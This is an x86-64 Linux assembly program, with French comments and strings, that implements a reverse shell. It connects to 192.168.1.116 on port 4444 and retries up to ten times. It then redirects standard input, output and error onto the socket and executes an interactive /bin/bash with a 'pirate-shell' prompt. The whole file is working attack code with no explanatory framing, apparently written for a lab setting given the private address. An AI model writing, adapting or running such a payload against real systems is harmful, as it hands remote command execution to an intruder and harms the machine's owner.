section .data
    sockaddr_in:
        dw 2                     ; AF_INET
        dw 0x5c11                ; Port 4444 (big endian -> 0x115c)
        dd 0x7401A8C0            ; IP 192.168.1.116
        dq 0

    binbash db "/bin/bash", 0
    arg1    db "-i", 0
    argv    dq binbash, arg1, 0

    env     dq env1, env2, 0
    env1    db "TERM=xterm-256color", 0
    env2    db "PS1=[pirate-shell] \\u@\\h:\\w\\$ ", 0

    welcome_msg db "Bienvenue sur la machine pirate", 10, 0

    msg_prefix db "Tentative de connexion... (", 0
    msg_suffix db "/10)", 10, 0

    sleep_time:
        dq 5
        dq 0

section .bss
    sock        resq 1
    attempts    resb 1
    buf_digit   resb 2     ; pour le chiffre + null

section .text
    global _start

_start:
    mov byte [attempts], 0

.retry_connect:
    ; afficher "Tentative de connexion... (x/10)"
    mov rax, 1              ; write
    mov rdi, 1              ; stdout
    lea rsi, [rel msg_prefix]
    mov rdx, 26
    syscall

    ; convertir attempts en ASCII
    movzx rax, byte [attempts]
    add al, '1'             ; afficher 1 à 10
    mov [buf_digit], al
    mov byte [buf_digit+1], 0

    mov rax, 1
    mov rdi, 1
    lea rsi, [buf_digit]
    mov rdx, 1
    syscall

    ; écrire "/10)\n"
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel msg_suffix]
    mov rdx, 5
    syscall

    ; socket(AF_INET, SOCK_STREAM, 0)
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    test    rax, rax
    js      .wait_retry
    mov     [sock], rax

    ; connect(sock, sockaddr_in, 16)
    mov     rdi, rax
    lea     rsi, [rel sockaddr_in]
    mov     rdx, 16
    mov     rax, 42
    syscall
    test    rax, rax
    js      .wait_retry

    ; write(sock, welcome_msg, len)
    mov     rax, 1
    mov     rdi, [sock]
    lea     rsi, [rel welcome_msg]
    mov     rdx, 33
    syscall

    ; dup2(sock, 0..2)
    mov     rdi, [sock]
    xor     rsi, rsi
.dup_loop:
    mov     rax, 33
    syscall
    inc     rsi
    cmp     rsi, 3
    jne     .dup_loop

    ; execve("/bin/bash", ["/bin/bash", "-i"], env)
    lea     rdi, [rel binbash]
    lea     rsi, [rel argv]
    lea     rdx, [rel env]
    mov     rax, 59
    syscall

    ; exit(1)
    mov     rax, 60
    mov     rdi, 1
    syscall

.wait_retry:
    inc byte [attempts]
    cmp byte [attempts], 10
    je .exit

    mov rax, 35
    lea rdi, [rel sleep_time]
    xor rsi, rsi
    syscall
    jmp .retry_connect

.exit:
    mov rax, 60
    xor rdi, rdi
    syscall
